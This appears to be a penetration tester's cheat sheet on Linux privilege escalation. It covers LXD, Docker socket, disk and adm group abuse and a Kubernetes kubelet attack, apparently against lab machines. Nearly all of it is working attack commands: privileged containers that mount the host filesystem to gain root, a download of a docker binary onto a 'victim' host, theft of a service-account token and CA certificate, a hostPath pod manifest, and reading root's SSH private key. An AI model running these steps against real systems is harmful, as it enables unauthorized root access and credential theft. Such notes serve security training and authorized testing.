# LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager.

Unzip the Alpine image.# 

 ```
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```
Start the LXD initialization process.
```
devops@NIX02:~$ lxd init
```
Import the local image.

```
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
```
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
```
Creating r00t
Mount the host file system.

```
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Device mydev added to r00t
Find in /mnt/root/root
```
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```
# Docker
## Docker Shared Directories

## Docker Sockets
Find a dcoker socket in the system
```
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```
Installing docker in the victim system ([docker](https://master.dockerproject.com/linux/x86_64/docker))
```
wget https://<parrot-os>:443/docker -O docker
chmod +x docker

/tmp/docker -H unix:///app/docker.sock ps
```
Configuration of the docker with the socket
```
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
## Docker Group
Using coker images in the system
```
docker image ls
```

### Docker Socket
Finding a docker soccket writeable "/var/run/docker.sock"
```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

# Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

# ADM
Members of the adm group are able to read all logs stored in /var/log. 

# Kubernetes
Identifying
```
# Annonymous auth
curl https://10.129.10.11:6443 -k

# Recon
kubeletctl -i --server 10.129.10.11 scan rce
```

Priv Esc
Extracting TOken
```
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
Extracting Certification
```
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```
List Privileges
```
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
Creating .yaml
```
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
Creating new Pod
```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```
Escalation
```
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
